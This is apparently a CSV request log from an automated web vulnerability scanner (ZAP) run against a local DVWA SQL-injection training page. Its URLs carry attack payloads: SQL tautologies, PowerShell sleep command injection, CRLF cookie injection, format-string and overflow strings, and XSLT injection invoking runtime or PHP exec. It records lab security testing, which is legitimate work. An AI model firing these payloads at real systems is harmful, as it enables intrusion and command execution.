ID,Petición (Tiempo),Marca de tiempo Respuesta,Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo)
277,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%3Bstart-sleep+-s+15.0,302,Found,1,628,0
278,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bstart-sleep+-s+15.0+%23,302,Found,1,628,0
279,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
280,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/,200,OK,1,613,1342
281,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/,200,OK,3,613,1342
282,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,0,224,366
283,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=xbmmbRwxMBasCtLtGqMQvLlnuXQoScgWNyVOtmsIyYAjsfZoVOXPTeoIHwaaVxtNhnlFYGfxrxiIgfhmULwqRQXdRyCaZWGhgTwTRjcsAdnWyXeuOQxMLmfijUfhqHaBPfvWKdoBWucmrGUUYymbDUNmmjwTfjtAkheuafDnWQCLeGOMltsMXPIGMnGcORjkRsWTlsSqNLrCtsgvvWVTlWflpkcdsiUjOEmZamOEfNOnJndabUuyrCIvyDudXifMalOnUXuwYEisnUFYiVAXLLSHMmxMTfrJojRWUpjBNEedkfXUeqVRVfCtvsDlUfoDLevjJuCAPQUXflnNbUMZIdTRXdIcONvmRHfmIUxtoEoJGAmNCYtoqtIooOkQgHTPjlnKCjvTECmvfFqFAlCmbGdbQZRCVcjLMFiNcXCHHKMaMgRkUjFEVQOdlWiYbNKHpSviMHInSiMUcYxsFKgmnTmHJvMAuJnFEERGNdujljCwIRHWHrqdIYNvtpyGKXQBltROqbVkHnoBKFwbymkRrmCKDuFMhonhyyipIoLgvJUJZNXevBdXoNLDVglLbZfiWREDSwuTuVOqpgQhCmLrhNwEJgjnehgmMixqhtmXETdIiosJTiBtWEyeOIaSYGiwrYMuQPYpdmxZtEQslSaIVxGrAhfpZTZqojKkqoFDQWEEFBZfooMhYbMJvIJiLErdVrmhZXUosCvOkTeeSCumbLsPpExdbTDOCTBvNWJnOoNtftUZhIiebyySweChlkIdUrTsHOdsHrSSHLXsSTbpIdixnDTMFVNHiQuNxlYcYsxnYFNWHUFCLVFLKJfpRCbZiWJSjFFjLrrOmPHNsirZQoSKaZBWSgpUmoRZkFKAtMjZrSxVrIKmtLiPnkrhOwZVLriViybBgdgkTUfUWqtIlFsTRvgWdNwualoxeMTLeVFTTxYvvujkbtTvYSBvwtQAVdthDNsUTvLSyZCnNSmTyJtrjgBLXcvwWaHbgvSTOcFMLKyNCaHWvhxphoElexNhMZecXHObGWfIaIQKUGFXGsrSiluruHDhKOCmbPfoXOTBtFjcyrbZxTLlglZAwDEMlCZFntJUdHSTmkoPKyFBxQntTNUtFxbfUMvkChGbYZpvaJhBsdZqTxlYFHNxOwWCGFfUIyqtRKOucAcJlbnENsTLiACMFxWgfuBYfoIwhNJaHuGwisXqjGMDJCeYIBvofLVgWpdYAFZHAkaxBVxQMhFsVYVWUrUsLRqAYAKbPfQgUpFknsNapFTumDaLsBXyyIpZcydZVmRvyWVQBWZqjEaArmUHSlbIKGtWGYqbgTSLiISYfUWmqnXvGCERsvoHnvuksJvnBkaPjurAXHtuSFKEUpjIKoaqbafQwCPFLPhPIpaVRbppmacwVMunMbdsKCSStNGsgNwUMOhLwexxnYLLqtLBihDkMiJobLdoaZvZGXShReEynKqheBcnJSVYZnGdfpMncSIENuEyARkXFJSgeMLvIHymKeyZOPmJNemUJLYBWphjdncjTUVlMykJRUsrucWaPSexgRumyFmQWWuFEhUSMuvLHKlrALikcnBkrDlAWdqhCYZjrwZVvTIpenbwLgfRYscqotypKeUIHWSArUwtjLcunCynwOuONkPyWPPaOVJnvrJlaPOoDAjKhxSTcqfflkGrVcZAKigkdmVaTMxOiFpstLQQNlBxBjgWvExrpssAnpdKmvAXgCQSPrDuSKnWSmFdoDlHEaLloaQhPlRDkYaKKhJMdWYZnPsQjIcyZxFXAwMJGJeLIHIiCanpNtfOoCNyxBYlrKWWnBjVdvKQUYwNmEeRXURuOsOTmyjwVruFeCbxkovOdrekyVyXylOeRMJQSVWrYXBHBZRxNTunlgTxXaNXTQFFrpWFQKkhmKBKEFigQyBXxtWkoCRjqeiTnXwfHxsfQVniCqyhIisIpiFCCJhrDHoNfxnyvkttiFpYCvAlgmqTcUIlkZHACXwtpCLnIOteJOKaerrSANETImdZNqnKXPqhuKXbUfkXxgKnfchoIOvSyEGAoCnNAMObBEuqmuPhAPNqvkYusEkupaUNlnpllSIxKbarGHmIZNoq&Submit=Submit,200,OK,1,613,1342
284,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=dlnIGZjlunyFnSirRJaAriBkXUmMOqyBvUEVDTvPNGMChErJrMVTvuVevSxYOmEBfCUGhZsVZUgjlcaCQKItqIoZLCLWpndCOWbfTPxPUeJHBLVoqgHNqpknsEWtarLJiZWtoxMRtvcvYbJVpMWNpTNsAinfKUxUpRXJnbhfnRhswZINawvcnFHiCEGSyoMVLkuqQHIKibDjPLRoGrEIbouJqZsfgoWMscnwHfoeqGYETUttNQwPCnFaijRfqSphKQEXOwAhRQJwCVhGfXKPBLRyggmJbcvQYusyfNZHURtaxXXCoMXoVVsQvsqCNafgONwkIdyGRaWotAXsDqKuQKgvYNOgFRvVqtxkjONIPRgLIenPSXPyIRfnKdDvxHTJmatEvmCXwFViDniCYYYBWGqvECYLeZehyTNfRIORspkNSiIqcsswRcTiPXGFplUPajtgbUwYGwemdYAemfWZFujqEptFnimcxGnjpFLYpLqderAbAONTpMclCZZcwgVUKKinBVCwNDOHMlvxpDwhRedrFhKNqtZTxWbNmKCwWNRnkZdlQwRFXfUAARseuyhJGsbetHSndIWPclwKsdLiYCknKeCACbSpRPiNPlQTTofEcDUohhrCVrctSgtcgZfduUGmqqlcyQuinVHopAelMunGOCSuGHpKsjDyjyRqlJtTcenGcEaNLYjLCeBeoStcmxaYKlirIEERNvidRYLIUhjsKMLuCAKrWIWBiTCMAXoJGUlbuDwIeZNMwwJmfjquPKBoJwvUZogPtYmUjaAFBkWCUYxRMPUCKqHnLtKwklEHwGJPTxersSfcjpfALRanPVGdFbbxGGWROOglbGNgyYnNDYZXlsjGpnNEbvBwMJaIHpTefGUDHasTQwBAFXXnTHjWiaMNsQrtBjjQbHDtnYFnCqYdHHPLRLbMAlhXLtxfrwKtSaUxdijUqoNSmUwgrTgunBfIDfaGkDiGWHkQBvpLyOqDShIFTBZeFUmxayLFvXpWcYXZYkgEkuGSPOvNRFUwxIvwRSEfArFbUCpesqjhiJJyFFQEOuSIsTequwyhGYymHdufmrtbVTFyrTYbgDBRRyHHuKIQwNaaZYUJaBAUruSttwmqVRVkTuYNnijHvUPZaLbnaCvxRKqFLyOEOnddCWmhIaNQuZsjelOjNCscoPrUDEvuOpHdLBnTqWgOSffKHvoLyLZdrvBRHnbsOkZanJuiToxZIRdawKsnfGEIDIIJEoWCjOxRPRVYsJEthhnRVNgLxltVKWQjsuDoCFVjwvEkwOycvorDqCxNTvmeVJiEUBGtimbatrfIBgnCbQvfZHpFqhqZCsKfeiLAQprcUwLoTboFqaZVtWFPgdVZdSiSRaJwIkwlEeorjnLDMyHNcHOISMQMVdmHKciKNLSMbonItfaHpjJMWWBgKfUIfWsZuwshAhGIaGAJOxtZhOZMsHOtfKyTQwdjYKWhYBhxPxXJOvfxfMocUangijMxlVvFMIsYOwVeVMUfQYWHehXWMvJospsFFCJUVsDfJMTLaHgkjxAGXHBjJodTyxFGoFJYNJUquMbhHJHEslDVKjQDZTGAFgSiuPMIHiOQwhyfjeomNCKkLSZVyUjpBFsLXdCXGYXyCCjFJxvGRKZkjqorltnekkPbVHwPtYYUpDPYnNZXoiviCywclkkimCmpglskFCsTlaJkjtVdWOjgyZPGvTKDgTqoWWsNorpsPYQNhGmhkdXVytShpxMWqVavPUHaIaixFKHvkoGyGnsIGKpnnufApKQkqIvAHtPDEhvfgAsLYZOwwKOZtABapKwBHqIWQLiNsgtGKAglIrADmoFXsgDDUJpoanMdCAsNqucwlqmsXXDIibqUmpKqsFiechpulPEVvWyWsncooTeEMKstayyObOieVesCdPHGIvotKxwUbhgUXnIxudSDTBMccONWgcbCMVAcVLOpbBMGpqpywrTkAJIwStJMIVcEyVHWVImJkdgeUZLnirbwTfKpMpvlikggwfGoxINKlQqZHqGXpUgYrrIPRhJOfiTZQFRlqPVrQifrgYgtBYSFuyqaxTOqQhatHHtcaAmgoTqQQTIUvNYR,200,OK,1,613,1342
285,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
286,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=ZAP&Submit=Submit,200,OK,1,613,1342
287,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A&Submit=Submit,200,OK,2,613,1342
288,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A&Submit=Submit,200,OK,1,613,1342
289,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=ZAP,200,OK,1,613,1342
290,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A,200,OK,1,613,1342
291,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A,200,OK,1,613,1342
292,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
293,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=Set-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68&Submit=Submit,302,Found,2,628,0
294,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68&Submit=Submit,302,Found,1,628,0
295,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%3F%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68&Submit=Submit,302,Found,1,628,0
296,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68&Submit=Submit,302,Found,1,628,0
297,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%3F%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68&Submit=Submit,302,Found,1,628,0
298,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68%0D%0A&Submit=Submit,302,Found,1,628,0
299,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=any%3F%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68%0D%0A&Submit=Submit,302,Found,1,628,0
300,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Set-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68,302,Found,0,628,0
301,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68,302,Found,1,628,0
302,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%3F%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68,302,Found,1,628,0
303,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68,302,Found,1,628,0
304,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%3F%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68,302,Found,1,628,0
305,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68%0D%0A,302,Found,1,628,0
306,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=any%3F%0D%0ASet-cookie%3A+Tamper%3Dc17b0323-2efa-4ad7-ba69-6e0a1815de68%0D%0A,302,Found,1,628,0
307,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
308,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,200,OK,3,613,1342
309,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?=&Submit=Submit,200,OK,1,613,1342
310,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=&Submit=Submit,200,OK,2,613,1342
311,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%40&Submit=Submit,200,OK,1,613,1342
312,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%2B&Submit=Submit,200,OK,1,613,1342
313,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%00&Submit=Submit,200,OK,1,613,1342
314,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7C&Submit=Submit,200,OK,1,613,1342
315,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,200,OK,0,613,1342
316,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&=,200,OK,1,613,1342
317,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=,200,OK,1,613,1342
318,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%40,200,OK,0,613,1342
319,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%2B,200,OK,1,613,1342
320,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%00,200,OK,1,613,1342
321,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7C,200,OK,1,613,1342
322,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/actuator/health,404,Not Found,1,161,311
323,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
324,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/actuator/health,404,Not Found,1,161,311
325,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
326,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C&Submit=Submit,200,OK,1,613,1342
327,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&Submit=Submit,200,OK,1,613,1342
328,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=system-property%28%27xsl%3Avendor%27%29%2F%3E&Submit=Submit,200,OK,1,613,1342
329,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&Submit=Submit,200,OK,1,613,1342
330,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&Submit=Submit,200,OK,1,613,1342
331,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&Submit=Submit,200,OK,1,613,1342
332,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&Submit=Submit,200,OK,1,613,1342
333,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&Submit=Submit,200,OK,1,613,1342
334,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C,200,OK,1,613,1342
335,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,1,613,1342
336,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,1,613,1342
337,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,1,613,1342
338,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
339,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
